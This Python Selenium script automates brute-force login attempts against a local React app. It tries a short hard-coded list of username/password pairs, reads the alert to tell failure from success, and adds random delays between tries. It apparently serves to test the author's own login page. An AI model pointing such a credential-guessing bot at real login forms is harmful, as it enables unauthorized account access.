from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time
import random

# Initialize WebDriver (ensure 'chromedriver' is in your PATH or specify the path)
driver = webdriver.Chrome()

# List of credentials to try
credentials_list = [
    {"username": "admin", "password": "admin123"},
    {"username": "user1", "password": "password1"},
    {"username": "abc", "password": "xyz"},  # Expected correct credentials
    {"username": "test", "password": "test123"},
    {"username": "user2", "password": "password2"},
]

# Open the React app login page
driver.get("http://localhost:3000")

def clear_web_field(element):
    # Continuously send backspace until the field is empty
    while element.get_attribute("value") != "":
        element.send_keys(Keys.BACKSPACE)

# Function to simulate brute-force login attempts
def brute_force_login():
    for credentials in credentials_list:
        # Find username and password fields and submit button
        username_field = driver.find_element(By.XPATH, '//input[@type="text"]')
        password_field = driver.find_element(By.XPATH, '//input[@type="password"]')
        login_button = driver.find_element(By.XPATH, '//button[@type="submit"]')
        
        # Clear fields and enter new credentials
        clear_web_field(username_field)
        clear_web_field(password_field)

        username_field.send_keys(credentials["username"])
        password_field.send_keys(credentials["password"])

        # Click the login button
        login_button.click()

        # Check for success (this is based on your React alert logic)
        try:
            alert = driver.switch_to.alert
            print(f"Login failed for {credentials['username']} / {credentials['password']}")
            alert.accept()
        except:
            print(f"Login successful for {credentials['username']} / {credentials['password']}")
            break  # Stop after successful login

        # Random delay between attempts
        time.sleep(random.uniform(1, 2))


# Run the brute-force bot
brute_force_login()

# Close the browser after completing attempts
driver.quit()
